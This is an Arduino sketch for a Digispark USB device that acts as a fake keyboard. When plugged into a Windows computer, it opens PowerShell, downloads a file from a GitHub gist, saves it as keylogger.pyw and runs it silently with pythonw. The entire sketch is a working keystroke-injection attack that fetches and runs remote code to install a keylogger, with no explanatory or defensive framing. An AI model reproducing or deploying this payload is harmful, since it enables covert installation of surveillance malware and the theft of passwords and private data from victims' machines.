#include "DigiKeyboard.h"

void setup() {

    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
    DigiKeyboard.print("Invoke-WebRequest -Uri \"https://gist.github.com/san2003/b27d7e5944488c86597ed9af46691755\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(1000);
    DigiKeyboard.print("pythonw keylogger.pyw");
    delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    delay(500);
;}

void loop() {
    
}
